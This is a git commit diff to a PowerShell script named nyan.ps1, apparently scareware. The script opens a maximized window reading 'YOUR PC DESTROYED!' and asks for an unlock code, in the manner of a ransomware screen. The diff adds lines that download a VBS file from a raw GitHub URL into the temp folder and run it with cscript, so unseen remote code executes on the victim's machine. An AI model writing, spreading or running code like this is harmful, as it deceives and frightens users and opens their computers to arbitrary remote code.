20c782b215773cf9d5137c5d200f633a1419a59a
Roario0602 <153424711+Roario0602@users.noreply.github.com>
2025-07-27 15:30:45 +0600

    Update nyan.ps1

--- nyan.ps1
+++ nyan.ps1
@@ -1,8 +1,20 @@
-# Максимизировать окно PowerShell (новое окно)
+# Максимизируем новое окно PowerShell с этим кодом
 $script = @'
 Clear-Host
 Write-Host "YOUR PC DESTROYED!" -ForegroundColor Red
 Read-Host "Введите код для разблокировки"
+
+# Путь для скачивания VBS
+$tempVbs = "$env:TEMP\temp.vbs"
+
+# Ссылка на VBS (raw ссылка с GitHub!)
+$vbsUrl = "https://raw.githubusercontent.com/Roario0602/nyan/main/temp.vbs"
+
+# Скачиваем temp.vbs
+Invoke-WebRequest -Uri $vbsUrl -OutFile $tempVbs
+
+# Запускаем temp.vbs через cscript
+Start-Process -FilePath "cscript.exe" -ArgumentList $tempVbs
 '@
 
 Start-Process powershell -ArgumentList "-NoExit", "-Command", $script -WindowStyle Maximized
